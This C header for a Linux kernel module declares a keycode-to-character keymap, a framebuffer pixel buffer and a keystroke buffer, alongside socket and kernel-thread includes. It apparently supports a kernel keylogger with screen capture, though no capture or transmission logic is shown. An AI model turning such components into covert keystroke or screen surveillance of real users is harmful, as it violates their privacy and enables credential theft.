#ifndef GLOBAL_VARIABLES_H
#define GLOBAL_VARIABLES_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/nsproxy.h>


char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, // 0-3
	{"3", "#"},
	{"4", "$"},
	{"5", "%"},
	{"6", "^"}, // 4-7
	{"7", "&"},
	{"8", "*"},
	{"9", "("},
	{"0", ")"}, // 8-11
	{"-", "_"},
	{"=", "+"},
	{"_BACKSPACE_", "_BACKSPACE_"}, // 12-14
	{"_TAB_", "_TAB_"},
	{"q", "Q"},
	{"w", "W"},
	{"e", "E"},
	{"r", "R"},
	{"t", "T"},
	{"y", "Y"},
	{"u", "U"},
	{"i", "I"}, // 20-23
	{"o", "O"},
	{"p", "P"},
	{"[", "{"},
	{"]", "}"}, // 24-27
	{"\n", "\n"},
	{"_LCTRL_", "_LCTRL_"},
	{"a", "A"},
	{"s", "S"}, // 28-31
	{"d", "D"},
	{"f", "F"},
	{"g", "G"},
	{"h", "H"}, // 32-35
	{"j", "J"},
	{"k", "K"},
	{"l", "L"},
	{";", ":"}, // 36-39
	{"'", "\""},
	{"`", "~"},
	{"_LSHIFT_", "_LSHIFT_"},
	{"\\", "|"}, // 40-43
	{"z", "Z"},
	{"x", "X"},
	{"c", "C"},
	{"v", "V"}, // 44-47
	{"b", "B"},
	{"n", "N"},
	{"m", "M"},
	{",", "<"}, // 48-51
	{".", ">"},
	{"/", "?"},
	{"_RSHIFT_", "_RSHIFT_"},
	{"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"},
	{" ", " "},
	{"_CAPS_", "_CAPS_"},
	{"F1", "F1"},
	{"F2", "F2"},
	{"F3", "F3"},
	{"F4", "F4"},
	{"F5", "F5"}, // 60-63
	{"F6", "F6"},
	{"F7", "F7"},
	{"F8", "F8"},
	{"F9", "F9"}, // 64-67
	{"F10", "F10"},
	{"_NUM_", "_NUM_"},
	{"_SCROLL_", "_SCROLL_"}, // 68-70
	{"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"},
	{"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"},
	{"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, // 74-76
	{"_KPD6_", "_RIGHT_"},
	{"+", "+"},
	{"_KPD1_", "_END_"}, // 77-79
	{"_KPD2_", "_DOWN_"},
	{"_KPD3_", "_PGDN"},
	{"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"},
	{"\0", "\0"}, // 83-85
	{"\0", "\0"},
	{"F11", "F11"},
	{"F12", "F12"},
	{"\0", "\0"}, // 86-89
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"_KPENTER_", "_KPENTER_"},
	{"_RCTRL_", "_RCTRL_"},
	{"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"},
	{"_RALT_", "_RALT_"},
	{"\0", "\0"}, // 99-101
	{"_HOME_", "_HOME_"},
	{"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, // 102-104
	{"_LEFT_", "_LEFT_"},
	{"_RIGHT_", "_RIGHT_"},
	{"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"},
	{"_PGDN", "_PGDN"},
	{"_INS_", "_INS_"}, // 108-110
	{"_DEL_", "_DEL_"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"}, // 111-114
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},
	{"\0", "\0"},			// 115-118
	{"_PAUSE_", "_PAUSE_"}, // 119
};


// Framebuffer variables
u8 *pixel_data_buffer ; // pointer to store the RGB data
int xres, yres; // loop counter and return value for functions that return an integer value (error checking) 
int screen_size;

/// Keyboard variables
#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */

char keybuf[BUF_LEN];
size_t buf_pos;
#endif